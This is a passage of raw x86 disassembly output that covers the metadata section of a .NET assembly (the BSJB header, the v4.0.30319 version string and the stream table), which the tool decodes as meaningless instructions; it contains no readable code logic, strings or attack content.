  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 06                	or     (%esi),%al
  4056c9:	17                   	pop    %ss
  4056ca:	73 10                	jae    0x4056dc
  4056cc:	01 00                	add    %eax,(%eax)
  4056ce:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4056d1:	02 16                	add    (%esi),%dl
  4056d3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4056d9:	00 0a                	add    %cl,(%edx)
  4056db:	08 6f 4f             	or     %ch,0x4f(%edi)
  4056de:	00 00                	add    %al,(%eax)
  4056e0:	0a de                	or     %dh,%bl
  4056e2:	0a 08                	or     (%eax),%cl
  4056e4:	2c 06                	sub    $0x6,%al
  4056e6:	08 6f 33             	or     %ch,0x33(%edi)
  4056e9:	00 00                	add    %al,(%eax)
  4056eb:	0a dc                	or     %ah,%bl
  4056ed:	06                   	push   %es
  4056ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4056ef:	09 01                	or     %eax,(%ecx)
  4056f1:	00 0a                	add    %cl,(%edx)
  4056f3:	0d de 0a 06 2c       	or     $0x2c060ade,%eax
  4056f8:	06                   	push   %es
  4056f9:	06                   	push   %es
  4056fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4056fb:	33 00                	xor    (%eax),%eax
  4056fd:	00 0a                	add    %cl,(%edx)
  4056ff:	dc 09                	fmull  (%ecx)
  405701:	2a 00                	sub    (%eax),%al
  405703:	00 01                	add    %al,(%ecx)
  405705:	1c 00                	sbb    $0x0,%al
  405707:	00 02                	add    %al,(%edx)
  405709:	00 20                	add    %ah,(%eax)
  40570b:	00 13                	add    %dl,(%ebx)
  40570d:	33 00                	xor    (%eax),%eax
  40570f:	0a 00                	or     (%eax),%al
  405711:	00 00                	add    %al,(%eax)
  405713:	00 02                	add    %al,(%edx)
  405715:	00 06                	add    %al,(%esi)
  405717:	00 40 46             	add    %al,0x46(%eax)
  40571a:	00 0a                	add    %cl,(%edx)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	00 00                	add    %al,(%eax)
  405720:	42                   	inc    %edx
  405721:	53                   	push   %ebx
  405722:	4a                   	dec    %edx
  405723:	42                   	inc    %edx
  405724:	01 00                	add    %eax,(%eax)
  405726:	01 00                	add    %eax,(%eax)
  405728:	00 00                	add    %al,(%eax)
  40572a:	00 00                	add    %al,(%eax)
  40572c:	0c 00                	or     $0x0,%al
  40572e:	00 00                	add    %al,(%eax)
  405730:	76 34                	jbe    0x405766
  405732:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405735:	33 30                	xor    (%eax),%esi
  405737:	33 31                	xor    (%ecx),%esi
  405739:	39 00                	cmp    %eax,(%eax)
  40573b:	00 00                	add    %al,(%eax)
  40573d:	00 05 00 6c 00 00    	add    %al,0x6c00
  405743:	00 64 1d 00          	add    %ah,0x0(%ebp,%ebx,1)
  405747:	00 23                	add    %ah,(%ebx)
  405749:	7e 00                	jle    0x40574b
  40574b:	00 d0                	add    %dl,%al
  40574d:	1d 00 00 44 26       	sbb    $0x26440000,%eax
  405752:	00 00                	add    %al,(%eax)
  405754:	23 53 74             	and    0x74(%ebx),%edx
  405757:	72 69                	jb     0x4057c2
  405759:	6e                   	outsb  %ds:(%esi),(%dx)
  40575a:	67 73 00             	addr16 jae 0x40575d
  40575d:	00 00                	add    %al,(%eax)
  40575f:	00 14 44             	add    %dl,(%esp,%eax,2)
  405762:	00 00                	add    %al,(%eax)
  405764:	20 28                	and    %ch,(%eax)
  405766:	00 00                	add    %al,(%eax)
  405768:	23 55 53             	and    0x53(%ebp),%edx
  40576b:	00 34 6c             	add    %dh,(%esp,%ebp,2)
  40576e:	00 00                	add    %al,(%eax)
  405770:	10 00                	adc    %al,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	23 47 55             	and    0x55(%edi),%eax
  405777:	49                   	dec    %ecx
  405778:	44                   	inc    %esp
  405779:	00 00                	add    %al,(%eax)
  40577b:	00 44 6c 00          	add    %al,0x0(%esp,%ebp,2)
  40577f:	00 68 09             	add    %ch,0x9(%eax)
  405782:	00 00                	add    %al,(%eax)
  405784:	23 42 6c             	and    0x6c(%edx),%eax
  405787:	6f                   	outsl  %ds:(%esi),(%dx)
  405788:	62 00                	bound  %eax,(%eax)
  40578a:	00 00                	add    %al,(%eax)
  40578c:	00 00                	add    %al,(%eax)
  40578e:	00 00                	add    %al,(%eax)
  405790:	02 00                	add    (%eax),%al
  405792:	00 01                	add    %al,(%ecx)
  405794:	57                   	push   %edi
  405795:	9f                   	lahf
  405796:	a2 3f 09 0a 00       	mov    %al,0xa093f
  40579b:	00 00                	add    %al,(%eax)
  40579d:	fa                   	cli
  40579e:	25 33 00 16 00       	and    $0x160033,%eax
  4057a3:	00 01                	add    %al,(%ecx)
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 9b 00 00 00 1d    	add    %bl,0x1d000000(%ebx)
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 45 00             	add    %al,0x0(%ebp)
  4057b2:	00 00                	add    %al,(%eax)
  4057b4:	a1 00 00 00 6e       	mov    0x6e000000,%eax
  4057b9:	00 00                	add    %al,(%eax)
  4057bb:	00 02                	add    %al,(%edx)
  4057bd:	00 00                	add    %al,(%eax)
  4057bf:	00 10                	add    %dl,(%eax)
  4057c1:	01 00                	add    %eax,(%eax)
  4057c3:	00 13                	add    %dl,(%ebx)
  4057c5:	00 00                	add    %al,(%eax)
  4057c7:	00 2d 00 00 00 02    	add    %ch,0x2000000
  4057cd:	00 00                	add    %al,(%eax)
  4057cf:	00 2e                	add    %ch,(%esi)
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 04 00             	add    %al,(%eax,%eax,1)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	12 00                	adc    (%eax),%al
  4057da:	00 00                	add    %al,(%eax)
  4057dc:	1e                   	push   %ds
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	00 04 00             	add    %al,(%eax,%eax,1)
  4057e2:	00 00                	add    %al,(%eax)
  4057e4:	02 00                	add    (%eax),%al
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	06                   	push   %es
  4057e9:	00 00                	add    %al,(%eax)
  4057eb:	00 04 00             	add    %al,(%eax,%eax,1)
  4057ee:	00 00                	add    %al,(%eax)
  4057f0:	02 00                	add    (%eax),%al
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	01 00                	add    %eax,(%eax)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	08 00                	or     %al,(%eax)
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	04 00                	add    $0x0,%al
  4057fe:	00 00                	add    %al,(%eax)
  405800:	03 00                	add    (%eax),%eax
  405802:	00 00                	add    %al,(%eax)
  405804:	00 00                	add    %al,(%eax)
  405806:	27                   	daa
  405807:	18 01                	sbb    %al,(%ecx)
  405809:	00 00                	add    %al,(%eax)
  40580b:	00 00                	add    %al,(%eax)
  40580d:	00 06                	add    %al,(%esi)
  40580f:	00 9c 20 83 17 0a 00 	add    %bl,0xa1783(%eax,%eiz,1)
  405816:	4c                   	dec    %esp
  405817:	00 a3 1e 0a 00 c9    	add    %ah,-0x36fff5e2(%ebx)
  40581d:	20 1d 20 0a 00 2b    	and    %bl,0x2b000a20
  405823:	17                   	pop    %ss
  405824:	c7                   	(bad)
  405825:	25 06 00 89 1c       	and    $0x1c890006,%eax
  40582a:	77 13                	ja     0x40583f
  40582c:	06                   	push   %es
  40582d:	00 2b                	add    %ch,(%ebx)
  40582f:	10 a3 1e 0a 00 89    	adc    %ah,-0x76fff5e2(%ebx)
  405835:	18 a3 1e 0a 00 e6    	sbb    %ah,-0x19fff5e2(%ebx)
  40583b:	1f                   	pop    %ds
  40583c:	c7                   	(bad)
  40583d:	25 06 00 26 21       	and    $0x21260006,%eax
  405842:	83 17 06             	adcl   $0x6,(%edi)
  405845:	00 a6 13 c8 22 06    	add    %ah,0x622c813(%esi)
  40584b:	00 d6                	add    %dl,%dh
  40584d:	1c a0                	sbb    $0xa0,%al
  40584f:	1f                   	pop    %ds
  405850:	06                   	push   %es
  405851:	00 24 00             	add    %ah,(%eax,%eax,1)
  405854:	35 0b 06 00 16       	xor    $0x1600060b,%eax
  405859:	0e                   	push   %cs
  40585a:	a0 1f 06 00 53       	mov    0x5300061f,%al
  40585f:	17                   	pop    %ss
  405860:	0c 06                	or     $0x6,%al
  405862:	06                   	push   %es
  405863:	00 ea                	add    %ch,%dl
  405865:	17                   	pop    %ss
  405866:	83 17 0a             	adcl   $0xa,(%edi)
  405869:	00 0b                	add    %cl,(%ebx)
  40586b:	20 dc                	and    %bl,%ah
  40586d:	1d 0e 00 2d 1a       	sbb    $0x1a2d000e,%eax
  405872:	b3 13                	mov    $0x13,%bl
  405874:	0e                   	push   %cs
  405875:	00 6a 20             	add    %ch,0x20(%edx)
  405878:	b3 13                	mov    $0x13,%bl
  40587a:	06                   	push   %es
  40587b:	00 73 24             	add    %dh,0x24(%ebx)
  40587e:	77 13                	ja     0x405893
  405880:	0a 00                	or     (%eax),%al
  405882:	36 1f                	ss pop %ds
  405884:	2b 00                	sub    (%eax),%eax
  405886:	12 00                	adc    (%eax),%al
  405888:	19 00                	sbb    %eax,(%eax)
  40588a:	2c 1e                	sub    $0x1e,%al
  40588c:	12 00                	adc    (%eax),%al
  40588e:	01 00                	add    %eax,(%eax)
  405890:	83 17 12             	adcl   $0x12,(%edi)
  405893:	00 61 10             	add    %ah,0x10(%ecx)
  405896:	2c 1e                	sub    $0x1e,%al
  405898:	06                   	push   %es
  405899:	00 cc                	add    %cl,%ah
  40589b:	0f 83 17 06 00 6e    	jae    0x6e405eb8
  4058a1:	11 2c 1e             	adc    %ebp,(%esi,%ebx,1)
  4058a4:	06                   	push   %es
  4058a5:	00 db                	add    %bl,%bl
  4058a7:	11 2c 1e             	adc    %ebp,(%esi,%ebx,1)
  4058aa:	06                   	push   %es
  4058ab:	00 8b 10 dc 1d 6f    	add    %cl,0x6f1ddc10(%ebx)
  4058b1:	00 4c 1e 00          	add    %cl,0x0(%esi,%ebx,1)
  4058b5:	00 06                	add    %al,(%esi)
  4058b7:	00 b3 10 3d 19 06    	add    %dh,0x6193d10(%ebx)
  4058bd:	00 3a                	add    %bh,(%edx)
  4058bf:	11 3d 19 06 00 1b    	adc    %edi,0x1b000619
  4058c5:	11 3d 19 06 00 c2    	adc    %edi,0xc2000619
  4058cb:	11 3d 19 06 00 8e    	adc    %edi,0x8e000619
  4058d1:	11 3d 19 06 00 a7    	adc    %edi,0xa7000619
  4058d7:	11 3d 19 06 00 ca    	adc    %edi,0xca000619
  4058dd:	10 3d 19 06 00 9f    	adc    %bh,0x9f000619
  4058e3:	10 0d 1e 06 00 fe    	adc    %cl,0xfe00061e
  4058e9:	10 3d 19 06 00 e5    	adc    %bh,0xe5000619
  4058ef:	10 ca                	adc    %cl,%dl
  4058f1:	13 06                	adc    (%esi),%eax
  4058f3:	00 70 10             	add    %dh,0x10(%eax)
  4058f6:	2c 1e                	sub    $0x1e,%al
  4058f8:	06                   	push   %es
  4058f9:	00 57 11             	add    %dl,0x11(%edi)
  4058fc:	3d 19 06 00 ea       	cmp    $0xea000619,%eax
  405901:	0b 77 13             	or     0x13(%edi),%esi
  405904:	06                   	push   %es
  405905:	00 6a 22             	add    %ch,0x22(%edx)
  405908:	83 17 06             	adcl   $0x6,(%edi)
  40590b:	00 ad 21 83 17 06    	add    %ch,0x6178321(%ebp)
  405911:	00 d2                	add    %dl,%dl
  405913:	17                   	pop    %ss
  405914:	83 17 06             	adcl   $0x6,(%edi)
  405917:	00 aa 13 c8 22 0a    	add    %ch,0xa22c813(%edx)
  40591d:	00 26                	add    %ah,(%esi)
  40591f:	25 a3 1e 06 00       	and    $0x61ea3,%eax
  405924:	9d                   	popf
  405925:	17                   	pop    %ss
  405926:	3c 25                	cmp    $0x25,%al
  405928:	06                   	push   %es
  405929:	00 b6 1b 3c 25 06    	add    %dh,0x6253c1b(%esi)
  40592f:	00 4b 13             	add    %cl,0x13(%ebx)
  405932:	3c 25                	cmp    $0x25,%al
  405934:	06                   	push   %es
  405935:	00 c6                	add    %al,%dh
  405937:	19 83 17 0a 00 13    	sbb    %eax,0x13000a17(%ebx)
  40593d:	20 b7 20 0a 00 44    	and    %dh,0x44000a20(%edi)
  405943:	21 b7 20 0a 00 51    	and    %esi,0x51000a20(%edi)
  405949:	16                   	push   %ss
  40594a:	b7 20                	mov    $0x20,%bh
  40594c:	0a 00                	or     (%eax),%al
  40594e:	6f                   	outsl  %ds:(%esi),(%dx)
  40594f:	25 1d 20 0a 00       	and    $0xa201d,%eax
  405954:	eb 0f                	jmp    0x405965
  405956:	1d 20 0a 00 d6       	sbb    $0xd6000a20,%eax
  40595b:	0f 1d 20             	nopl   (%eax)
  40595e:	06                   	push   %es
  40595f:	00 39                	add    %bh,(%ecx)
  405961:	14 83                	adc    $0x83,%al
  405963:	17                   	pop    %ss
  405964:	06                   	push   %es
  405965:	00 8b 1b 83 17 0a    	add    %cl,0xa17831b(%ebx)
  40596b:	00 93 1f b7 20 0a    	add    %dl,0xa20b71f(%ebx)
  405971:	00 4d 1f             	add    %cl,0x1f(%ebp)
  405974:	b7 20                	mov    $0x20,%bh
  405976:	06                   	push   %es
  405977:	00 b3 1f 83 17 06    	add    %dh,0x617831f(%ebx)
  40597d:	00 22                	add    %ah,(%edx)
  40597f:	0e                   	push   %cs
  405980:	83 17 0a             	adcl   $0xa,(%edi)
  405983:	00 1d 17 1d 20 0a    	add    %bl,0xa201d17
  405989:	00 84 15 c7 25 0a 00 	add    %al,0xa25c7(%ebp,%edx,1)
  405990:	14 22                	adc    $0x22,%al
  405992:	b7 20                	mov    $0x20,%bh
  405994:	0a 00                	or     (%eax),%al
  405996:	4f                   	dec    %edi
  405997:	19 a3 1e 0a 00 71    	sbb    %esp,0x71000a1e(%ebx)
  40599d:	1f                   	pop    %ds
  40599e:	1e                   	push   %ds
  40599f:	19 06                	sbb    %eax,(%esi)
  4059a1:	00 1b                	add    %bl,(%ebx)
  4059a3:	12 83 17 06 00 a8    	adc    -0x57fff9e9(%ebx),%al
  4059a9:	15 77 13 06 00       	adc    $0x61377,%eax
  4059ae:	76 15                	jbe    0x4059c5
  4059b0:	83 17 0a             	adcl   $0xa,(%edi)
  4059b3:	00 0b                	add    %cl,(%ebx)
  4059b5:	15 83 17 0a 00       	adc    $0xa1783,%eax
  4059ba:	b8 0f 83 17 06       	mov    $0x617830f,%eax
  4059bf:	00 c1                	add    %al,%cl
  4059c1:	1c 83                	sbb    $0x83,%al
  4059c3:	17                   	pop    %ss
  4059c4:	06                   	push   %es
  4059c5:	00 51 22             	add    %dl,0x22(%ecx)
  4059c8:	77 13                	ja     0x4059dd
  4059ca:	06                   	push   %es
  4059cb:	00 4d 17             	add    %cl,0x17(%ebp)
  4059ce:	0c 06                	or     $0x6,%al
  4059d0:	06                   	push   %es
  4059d1:	00 41 1d             	add    %al,0x1d(%ecx)
  4059d4:	77 13                	ja     0x4059e9
  4059d6:	0a 00                	or     (%eax),%al
  4059d8:	e7 0d                	out    %eax,$0xd
  4059da:	1d 20 06 00 56       	sbb    $0x56000620,%eax
  4059df:	01 83 17 06 00 e8    	add    %eax,-0x17fff9e9(%ebx)
  4059e5:	1b c8                	sbb    %eax,%ecx
  4059e7:	22 33                	and    (%ebx),%dh
  4059e9:	00 1f                	add    %bl,(%edi)
  4059eb:	1d 00 00 06 00       	sbb    $0x60000,%eax
  4059f0:	68 00 83 17 06       	push   $0x6178300
  4059f5:	00 5f 00             	add    %bl,0x0(%edi)
  4059f8:	83 17 06             	adcl   $0x6,(%edi)
  4059fb:	00 30                	add    %dh,(%eax)
  4059fd:	0e                   	push   %cs
  4059fe:	83 17 06             	adcl   $0x6,(%edi)
  405a01:	00 96 0e 83 17 06    	add    %dl,0x617830e(%esi)
  405a07:	00 7b 0f             	add    %bh,0xf(%ebx)
  405a0a:	83 17 06             	adcl   $0x6,(%edi)
  405a0d:	00 12                	add    %dl,(%edx)
  405a0f:	17                   	pop    %ss
  405a10:	0c 06                	or     $0x6,%al
  405a12:	06                   	push   %es
  405a13:	00 9d 0e 0c 06 06    	add    %bl,0x6060c0e(%ebp)
  405a19:	00 97 0d 0c 06 06    	add    %dl,0x6060c0d(%edi)
  405a1f:	00 f6                	add    %dh,%dh
  405a21:	1f                   	pop    %ds
  405a22:	0c 06                	or     $0x6,%al
  405a24:	06                   	push   %es
  405a25:	00 f6                	add    %dh,%dh
  405a27:	0f 0c                	(bad)
  405a29:	06                   	push   %es
  405a2a:	06                   	push   %es
  405a2b:	00 d7                	add    %dl,%bh
  405a2d:	1f                   	pop    %ds
  405a2e:	2c 1e                	sub    $0x1e,%al
  405a30:	06                   	push   %es
  405a31:	00 f4                	add    %dh,%ah
  405a33:	24 83                	and    $0x83,%al
  405a35:	17                   	pop    %ss
  405a36:	06                   	push   %es
  405a37:	00 42 0e             	add    %al,0xe(%edx)
  405a3a:	83 17 06             	adcl   $0x6,(%edi)
  405a3d:	00 7c 18 83          	add    %bh,-0x7d(%eax,%ebx,1)
  405a41:	17                   	pop    %ss
  405a42:	06                   	push   %es
  405a43:	00 3c 1a             	add    %bh,(%edx,%ebx,1)
  405a46:	0c 06                	or     $0x6,%al
  405a48:	0a 00                	or     (%eax),%al
  405a4a:	8c 1a                	mov    %ds,(%edx)
  405a4c:	dc 1d 06 00 30 25    	fcompl 0x25300006
  405a52:	2b 00                	sub    (%eax),%eax
  405a54:	06                   	push   %es
  405a55:	00 a3 1c 0c 06 06    	add    %ah,0x6060c1c(%ebx)
  405a5b:	00 e1                	add    %ah,%cl
  405a5d:	14 0c                	adc    $0xc,%al
  405a5f:	06                   	push   %es
  405a60:	0a 00                	or     (%eax),%al
  405a62:	cd 0e                	int    $0xe
  405a64:	dc 1d 06 00 4f 1a    	fcompl 0x1a4f0006
  405a6a:	0c 06                	or     $0x6,%al
  405a6c:	0a 00                	or     (%eax),%al
  405a6e:	eb 0e                	jmp    0x405a7e
  405a70:	dc 1d 06 00 a4 25    	fcompl 0x25a40006
  405a76:	2b 00                	sub    (%eax),%eax
  405a78:	16                   	push   %ss
  405a79:	00 2e                	add    %ch,(%esi)
  405a7b:	1f                   	pop    %ds
  405a7c:	50                   	push   %eax
  405a7d:	0b 06                	or     (%esi),%eax
  405a7f:	00 b6 15 2b 00 06    	add    %dh,0x6002b15(%esi)
  405a85:	00 b0 1c 0c 06 06    	add    %dh,0x6060c1c(%eax)
  405a8b:	00 45 1a             	add    %al,0x1a(%ebp)
  405a8e:	0c 06                	or     $0x6,%al
  405a90:	16                   	push   %ss
  405a91:	00 5e 1a             	add    %bl,0x1a(%esi)
  405a94:	ef                   	out    %eax,(%dx)
  405a95:	1d 1a 00 56 1c       	sbb    $0x1c56001a,%eax
  405a9a:	9b                   	fwait
  405a9b:	21 1a                	and    %ebx,(%edx)
  405a9d:	00 69 19             	add    %ch,0x19(%ecx)
  405aa0:	9b                   	fwait
  405aa1:	21 bb 01 e2 1c 00    	and    %edi,0x1ce201(%ebx)
  405aa7:	00 1a                	add    %bl,(%edx)
  405aa9:	00 8e 20 9b 21 06    	add    %cl,0x6219b20(%esi)
  405aaf:	00 76 1d             	add    %dh,0x1d(%esi)
  405ab2:	83 17 06             	adcl   $0x6,(%edi)
  405ab5:	00 46 00             	add    %al,0x0(%esi)
  405ab8:	83 17 12             	adcl   $0x12,(%edi)
  405abb:	00 17                	add    %dl,(%edi)
  405abd:	0e                   	push   %cs
  405abe:	3e 1b 06             	sbb    %ds:(%esi),%eax
  405ac1:	00 0b                	add    %cl,(%ebx)
  405ac3:	00 35 0b 06 00 7a    	add    %dh,0x7a00060b
  405ac9:	17                   	pop    %ss
  405aca:	83 17 06             	adcl   $0x6,(%edi)
  405acd:	00 9d 1b 3c 25 06    	add    %bl,0x6253c1b(%ebp)
  405ad3:	00 b1 17 3c 25 1e    	add    %dh,0x1e253c17(%ecx)
  405ad9:	00 12                	add    %dl,(%edx)
  405adb:	19 7e 1f             	sbb    %edi,0x1f(%esi)
  405ade:	06                   	push   %es
  405adf:	00 db                	add    %bl,%bl
  405ae1:	25 63 16 06 00       	and    $0x61663,%eax
  405ae6:	7d 16                	jge    0x405afe
  405ae8:	63 16                	arpl   %edx,(%esi)
  405aea:	06                   	push   %es
  405aeb:	00 ab 0e 63 16 06    	add    %ch,0x616630e(%ebx)
  405af1:	00 48 0c             	add    %cl,0xc(%eax)
  405af4:	83 17 06             	adcl   $0x6,(%edi)
  405af7:	00 89 0e 77 13 0a    	add    %cl,0xa13770e(%ecx)
  405afd:	00 6f 1c             	add    %ch,0x1c(%edi)
  405b00:	2b 00                	sub    (%eax),%eax
  405b02:	0a 00                	or     (%eax),%al
  405b04:	3e 20 2b             	and    %ch,%ds:(%ebx)
  405b07:	00 06                	add    %al,(%esi)
  405b09:	00 58 0d             	add    %bl,0xd(%eax)
  405b0c:	2b 00                	sub    (%eax),%eax
  405b0e:	06                   	push   %es
  405b0f:	00 93 18 83 17 06    	add    %dl,0x6178318(%ebx)
  405b15:	00 66 25             	add    %ah,0x25(%esi)
  405b18:	3d 19 06 00 f1       	cmp    $0xf1000619,%eax
  405b1d:	0f 83 17 06 00 2a    	jae    0x2a40613a
  405b23:	1d 83 17 06 00       	sbb    $0x61783,%eax
  405b28:	65 0e                	gs push %cs
  405b2a:	83 17 22             	adcl   $0x22,(%edi)
  405b2d:	00 6b 1a             	add    %ch,0x1a(%ebx)
  405b30:	f6 1b                	negb   (%ebx)
  405b32:	22 00                	and    (%eax),%al
  405b34:	04 1f                	add    $0x1f,%al
  405b36:	f6 1b                	negb   (%ebx)
  405b38:	22 00                	and    (%eax),%al
  405b3a:	1d 1c f6 1b 12       	sbb    $0x121bf61c,%eax
  405b3f:	00 15 1c 2c 1e 22    	add    %dl,0x221e2c1c
  405b45:	00 1c 1f             	add    %bl,(%edi,%ebx,1)
  405b48:	f6 1b                	negb   (%ebx)
  405b4a:	06                   	push   %es
  405b4b:	00 d1                	add    %dl,%cl
  405b4d:	1e                   	push   %ds
  405b4e:	3c 25                	cmp    $0x25,%al
  405b50:	06                   	push   %es
  405b51:	00 be 19 83 17 06    	add    %bh,0x6178319(%esi)
  405b57:	00 d8                	add    %bl,%al
  405b59:	1e                   	push   %ds
  405b5a:	3c 25                	cmp    $0x25,%al
  405b5c:	12 00                	adc    (%eax),%al
  405b5e:	cf                   	iret
  405b5f:	1b 3c 25 06 00 35 17 	sbb    0x17350006(,%eiz,1),%edi
  405b66:	3c 25                	cmp    $0x25,%al
  405b68:	06                   	push   %es
  405b69:	00 7f 00             	add    %bh,0x0(%edi)
  405b6c:	3c 25                	cmp    $0x25,%al
  405b6e:	06                   	push   %es
  405b6f:	00 a8 19 83 17 06    	add    %ch,0x6178319(%eax)
  405b75:	00 8a 17 3c 25 06    	add    %cl,0x6253c17(%edx)
  405b7b:	00 dc                	add    %bl,%ah
  405b7d:	0d 3c 25 06 00       	or     $0x6253c,%eax
  405b82:	a0 0d 3c 25 06       	mov    0x6253c0d,%al
  405b87:	00 d9                	add    %bl,%cl
  405b89:	17                   	pop    %ss
  405b8a:	3c 25                	cmp    $0x25,%al
  405b8c:	06                   	push   %es
  405b8d:	00 bb 0d 3c 25 06    	add    %bh,0x6253c0d(%ebx)
  405b93:	00 91 19 3c 25 06    	add    %dl,0x6253c19(%ecx)
  405b99:	00 33                	add    %dh,(%ebx)
  405b9b:	1c 83                	sbb    $0x83,%al
  405b9d:	17                   	pop    %ss
  405b9e:	06                   	push   %es
  405b9f:	00 fa                	add    %bh,%dl
  405ba1:	0b 3c 25 0a 00 42 17 	or     0x1742000a(,%eiz,1),%edi
  405ba8:	fc                   	cld
  405ba9:	18 0a                	sbb    %cl,(%edx)
  405bab:	00 cc                	add    %cl,%ah
  405bad:	0d fc 18 00 00       	or     $0x18fc,%eax
  405bb2:	00 00                	add    %al,(%eax)
  405bb4:	93                   	xchg   %eax,%ebx
  405bb5:	00 00                	add    %al,(%eax)
  405bb7:	00 00                	add    %al,(%eax)
  405bb9:	00 01                	add    %al,(%ecx)
  405bbb:	00 01                	add    %al,(%ecx)
  405bbd:	00 01                	add    %al,(%ecx)
  405bbf:	00 10                	add    %dl,(%eax)
  405bc1:	00 35 08 c3 1a 05    	add    %dh,0x51ac308
  405bc7:	00 01                	add    %al,(%ecx)
  405bc9:	00 01                	add    %al,(%ecx)
  405bcb:	00 81 01 10 00 5b    	add    %al,0x5b001001(%ecx)
  405bd1:	1e                   	push   %ds
  405bd2:	c3                   	ret
  405bd3:	1a 05 00 01 00 03    	sbb    0x3000100,%al
  405bd9:	00 81 01 10 00 86    	add    %al,-0x79ffefff(%ecx)
  405bdf:	06                   	push   %es
  405be0:	fe 05 05 00 12 00    	incb   0x120005
  405be6:	06                   	push   %es
  405be7:	00 01                	add    %al,(%ecx)
  405be9:	00 10                	add    %dl,(%eax)
  405beb:	00 b8 05 e1 0a 05    	add    %bh,0x50ae105(%eax)
  405bf1:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405bf4:	22 00                	and    (%eax),%al
  405bf6:	01 00                	add    %eax,(%eax)
  405bf8:	10 00                	adc    %al,(%eax)
  405bfa:	0d 23 e1 0a 05       	or     $0x50ae123,%eax
  405bff:	00 1d 00 2d 00 01    	add    %bl,0x1002d00
  405c05:	00 10                	add    %dl,(%eax)
  405c07:	00 40 13             	add    %al,0x13(%eax)
  405c0a:	e1 0a                	loope  0x405c16
  405c0c:	05 00 1f 00 31       	add    $0x31001f00,%eax
  405c11:	00 01                	add    %al,(%ecx)
  405c13:	00 10                	add    %dl,(%eax)
  405c15:	00 8f 0b e1 0a 05    	add    %cl,0x50ae10b(%edi)
  405c1b:	00 21                	add    %ah,(%ecx)
  405c1d:	00 38                	add    %bh,(%eax)
  405c1f:	00 01                	add    %al,(%ecx)
  405c21:	01 00                	add    %eax,(%eax)
  405c23:	00 be 02 e1 0a 3d    	add    %bh,0x3d0ae102(%esi)
  405c29:	00 28                	add    %ch,(%eax)
  405c2b:	00 63 00             	add    %ah,0x0(%ebx)
  405c2e:	00 00                	add    %al,(%eax)
  405c30:	10 00                	adc    %al,(%eax)
  405c32:	68 0a e1 0a 05       	push   $0x50ae10a
  405c37:	00 35 00 63 00 00    	add    %dh,0x6300
  405c3d:	00 10                	add    %dl,(%eax)
  405c3f:	00 5c 09 e1          	add    %bl,-0x1f(%ecx,%ecx,1)
  405c43:	0a 05 00 35 00 67    	or     0x67003500,%al
  405c49:	00 00                	add    %al,(%eax)
  405c4b:	00 10                	add    %dl,(%eax)
  405c4d:	00 4d 15             	add    %cl,0x15(%ebp)
  405c50:	38 07                	cmp    %al,(%edi)
  405c52:	05 00 35 00 70       	add    $0x70003500,%eax
  405c57:	00 00                	add    %al,(%eax)
  405c59:	00 10                	add    %dl,(%eax)
  405c5b:	00 a2 24 8b 1d 05    	add    %ah,0x51d8b24(%edx)
  405c61:	00 35 00 72 00 00    	add    %dh,0x7200
  405c67:	00 10                	add    %dl,(%eax)
  405c69:	00 79 1b             	add    %bh,0x1b(%ecx)
  405c6c:	8b 1d 05 00 35 00    	mov    0x350005,%ebx
  405c72:	7b 00                	jnp    0x405c74
  405c74:	81 01 10 00 be 1d    	addl   $0x1dbe0010,(%ecx)
  405c7a:	8b 1d 05 00 35 00    	mov    0x350005,%ebx
  405c80:	7e 00                	jle    0x405c82
  405c82:	81 01 10 00 c4 17    	addl   $0x17c40010,(%ecx)
  405c88:	8b 1d 05 00 35 00    	mov    0x350005,%ebx
  405c8e:	80 00 80             	addb   $0x80,(%eax)
  405c91:	01 10                	add    %edx,(%eax)
  405c93:	00 6c 18 8b          	add    %ch,-0x75(%eax,%ebx,1)
  405c97:	1d 05 00 35 00       	sbb    $0x350005,%eax
  405c9c:	81 00 02 01 00 00    	addl   $0x102,(%eax)
  405ca2:	13 01                	adc    (%ecx),%eax
  405ca4:	00 00                	add    %al,(%eax)
  405ca6:	3d 00 35 00 87       	cmp    $0x87003500,%eax
  405cab:	00 81 01 10 00 d7    	add    %al,-0x28ffefff(%ecx)
  405cb1:	16                   	push   %ss
  405cb2:	8b 1d 05 00 39 00    	mov    0x390005,%ebx
  405cb8:	87 00                	xchg   %eax,(%eax)
  405cba:	81 01 10 00 92 05    	addl   $0x5920010,(%ecx)
  405cc0:	8b 1d 05 00 3a 00    	mov    0x3a0005,%ebx
  405cc6:	89 00                	mov    %eax,(%eax)
  405cc8:	81 01 10 00 20 05    	addl   $0x5200010,(%ecx)
  405cce:	8b 1d 05 00 3a 00    	mov    0x3a0005,%ebx
  405cd4:	8d 00                	lea    (%eax),%eax
  405cd6:	81 01 10 00 5a 1b    	addl   $0x1b5a0010,(%ecx)
  405cdc:	82 05 05 00 3b 00 92 	addb   $0x92,0x3b0005
  405ce3:	00 83 01 10 00 58    	add    %al,0x58001001(%ebx)
  405ce9:	05 00 00 05 00       	add    $0x50000,%eax
  405cee:	3c 00                	cmp    $0x0,%al
  405cf0:	97                   	xchg   %eax,%edi
  405cf1:	00 01                	add    %al,(%ecx)
  405cf3:	00 10                	add    %dl,(%eax)
  405cf5:	00 47 04             	add    %al,0x4(%edi)
  405cf8:	b0 02                	mov    $0x2,%al
  405cfa:	05 00 3d 00 97       	add    $0x97003d00,%eax
  405cff:	00 81 01 10 00 34    	add    %al,0x34001001(%ecx)
  405d05:	18 b0 02 05 00 44    	sbb    %dh,0x44000502(%eax)
  405d0b:	00 9e 00 81 01 10    	add    %bl,0x10018100(%esi)
  405d11:	00 29                	add    %ch,(%ecx)
  405d13:	08 b0 02 05 00 44    	or     %dh,0x44000502(%eax)
